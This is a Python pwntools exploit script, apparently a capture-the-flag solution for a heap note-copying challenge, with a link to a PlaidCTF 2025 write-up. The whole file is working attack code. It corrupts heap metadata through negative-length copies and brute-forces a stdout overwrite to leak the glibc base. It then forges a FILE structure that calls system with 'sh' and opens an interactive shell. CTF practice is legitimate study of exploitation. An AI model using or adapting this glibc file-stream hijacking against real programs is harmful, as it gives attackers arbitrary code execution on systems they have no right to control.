from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def create_notes(size, data, orange=False):
    if orange:
        p.sendlineafter(b"> ", b'0'*0x1000)
    else:
        p.sendlineafter(b"> ", b'0')
    p.sendlineafter(b"size: ", str(size).encode())
    if size == len(data):
        p.send(data)
    elif size > len(data):
        p.sendline(data)

def copy_notes(dst, src, len):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"dst: ", str(dst).encode())
    p.sendlineafter(b"src: ", str(src).encode())
    p.sendlineafter(b"len: ", str(len).encode())

glibc_e = ELF('./libc.so.6')

while True:
    p = gdb.debug('./copy_patched', '''
        continue
    ''')

    # p = process('./copy_patched')

    create_notes(0x47, b'A'*0x28+p64(0xcf0)+b'A'*0x17)
    create_notes(0x27, b'B'*0x27)
    copy_notes(1, 0, -1)
    create_notes(0x37, b'C'*0x37, True)

    create_notes(0x2, p16(glibc_e.symbols['_IO_2_1_stdout_']&0xffff))
    copy_notes(0, 2, -1)
    copy_notes(0, 1, -1)
    copy_notes(0, 1, -0x50)
    copy_notes(0, 1, -0x50*2)
    copy_notes(0, 1, -0x50*3)
    copy_notes(0, 1, -0x50*4)
    copy_notes(0, 1, -0x50*5)
    copy_notes(0, 1, -0x50*6)
    copy_notes(0, 1, -0x220)

    try:
        create_notes(0x57, p64(0xfbad1887)+p64(0)*3)
    except:
        p.close()
        continue
    try:
        glibc_base_addr = u64(p.recvuntil(b"[[", drop=True)[:-3][-0x18:-0x10])-glibc_e.symbols['_IO_2_1_stdin_']
    except:
        p.close()
        continue
    if glibc_base_addr&0xfff != 0:
        p.close()
        continue
    log.info(f"glibc base address: {hex(glibc_base_addr)}")

    fake = FileStructure(0)
    fake.flags = 0x687320
    fake._IO_read_ptr = 0x0
    fake._IO_write_base = 0x0
    fake._IO_write_ptr = 0x1
    fake._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']-0x10
    fake.unknown2 = p64(0)*4+p64(glibc_base_addr+glibc_e.sym.system)+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x60)
    fake.vtable = glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']
    create_notes(0xf7, bytes(fake))

    p.interactive()

# https://unvariant.pages.dev/writeups/plaidctf-2025/pwn-bounty-board/